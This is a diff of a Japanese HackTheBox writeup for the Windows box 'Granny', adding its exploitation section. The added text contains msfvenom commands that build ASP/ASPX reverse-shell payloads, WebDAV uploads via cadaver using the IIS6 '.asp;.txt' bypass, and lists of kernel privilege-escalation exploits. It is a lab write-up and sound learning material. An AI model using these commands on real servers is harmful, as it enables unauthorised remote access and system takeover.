@@ -2,7 +2,7 @@
 title: 【Easy/Windows】Granny Writeup(HackTheBox)
 date: "2022-07-24"
 template: "post"
-draft: true
+draft: false
 slug: "hackthebox-windows-granny."
 category: "HackTheBox"
 tags:
@@ -30,12 +30,11 @@ socialImage: "/media/cards/no-image.png"
 またすべての発言は所属団体ではなく個人に帰属します。
 
 <!-- omit in toc -->
-
 ## もくじ
-
-
-
-
+- [本記事について](#本記事について)
+- [探索](#探索)
+- [内部探索](#内部探索)
+- [まとめ](#まとめ)
 
 ## 探索
 
@@ -133,3 +132,111 @@ $ curl -T test.html http://targethost.htb
 
 ![image-20220724100558683](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724100558683.png)
 
+というわけでエクスプロイトコードをアップロードします。
+
+ただし、aspファイルのアップロードは制限されているため、直接PUTすることはできません。
+
+そこで、IIS5またはIIS6に存在するWebDavの脆弱性を悪用します。
+
+今回はIIS6.0が使用されているので、以下のようにtxtとしてアップロードしたエクスプロイトファイルを`.asp;.txt`にリネームすることによって、`shell.asp`を実行させることが可能になります。
+
+``` bash
+$ msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=4444 -f asp > shell.txt
+
+$ cadaver http://targethost.htb
+dav:/> put shell.txt
+dav:/> copy shell.txt shell.asp;.txt
+```
+
+参考：[WebDav - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav#iis5-6-webdav-vulnerability)
+
+これでリバースシェルが取得できると思ったのですが、なぜかすぐにセッションが切れてしまい、シェルの取得にいたりません。
+
+![image-20220724165527786](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724165527786.png)
+
+`netcat-traditional`を試してみたもののの、こちらも失敗しました。
+
+パケットを見てみると、Victimからインバウンド通信があり、ACKを受け取るところまでで終了しているようです。
+
+![image-20220724180511650](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724180511650.png)
+
+結局問題が解決できなさそうだったので、aspxを試してみることにしました。
+
+``` bash
+$ msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4445 -o rev.txt
+$ cadaver http://targethost.htb
+put rev.txt
+move rev.txt rev.aspx
+```
+
+`.aspx`の場合、PUTはできないけどMOVEはできました。
+
+これでリバースシェルが取得できました。
+
+![image-20220724221130529](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724221130529.png)
+
+## 内部探索
+
+さっさと権限昇格を目指しましょう。
+
+いつも通り`windows-exploit-suggester`を回します。
+
+``` bash
+rm ./*.xls
+python windows-exploit-suggester.py --update
+ls ./*.xls | (read d; python windows-exploit-suggester.py --systeminfo systeminfo.txt --database $d)
+```
+
+沢山でてきました。
+
+よりどりみどりです。
+
+![image-20220724221450276](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724221450276.png)
+
+色々試してみます。
+
+- NG：
+  - [MS15-010](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-010)
+  - [MS14-002](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-002)
+  - [MS14-058](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058)
+  - [MS14-070](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070)
+  - [MS13-053.exe](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS13-053)
+    ※ 成功はしたが恐らく別プロセスのターミナルがSpawnしている
+  - [MS11-011](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-011)
+  - [MS14-40](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-040)
+
+だめそうなのでsearchsploitも使ってみます。
+
+``` bash
+$ searchsploit Microsoft Windows Server 2003
+----------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                 |  Path
+----------------------------------------------------------------------------------------------- ---------------------------------
+Microsoft Exchange Server 2000/2003 - Outlook Web Access Script Injection                      | windows/remote/28005.pl
+Microsoft Outlook Web Access for Exchange Server 2003 - 'redir.asp' Open Redirection           | windows/remote/32489.txt
+Microsoft Outlook Web Access for Exchange Server 2003 - Cross-Site Request Forgery             | windows/dos/34359.html
+Microsoft Windows Server 2000 < 2008 - Embedded OpenType Font Engine Remote Code Execution (MS | windows/dos/10068.rb
+Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)                                 | windows/remote/7132.py
+Microsoft Windows Server 2000/2003 - Recursive DNS Spoofing (1)                                | windows/remote/30635.pl
+Microsoft Windows Server 2000/2003 - Recursive DNS Spoofing (2)                                | windows/remote/30636.pl
+Microsoft Windows Server 2003 - '.EOT' Blue Screen of Death Crash                              | windows/dos/9417.txt
+Microsoft Windows Server 2003 - AD BROWSER ELECTION Remote Heap Overflow                       | windows/dos/16166.py
+Microsoft Windows Server 2003 - NetpIsRemote() Remote Overflow (MS06-040) (Metasploit)         | windows/remote/2355.pm
+Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation                    | windows/local/6705.txt
+Microsoft Windows Server 2003 SP2 - Local Privilege Escalation (MS14-070)                      | windows/local/35936.py
+Microsoft Windows Server 2003 SP2 - TCP/IP IOCTL Privilege Escalation (MS14-070)               | windows/local/37755.c
+----------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+結果として、`Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation                    | windows/local/6705.txt`以外は実行がうまくいきませんでした。
+
+不可解。。
+
+とはいえとりあえずエクスプロイトはささったのでFlagを取得できました。
+
+![image-20220724235626601](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724235626601.png)
+
+## まとめ
+
+疲れた。
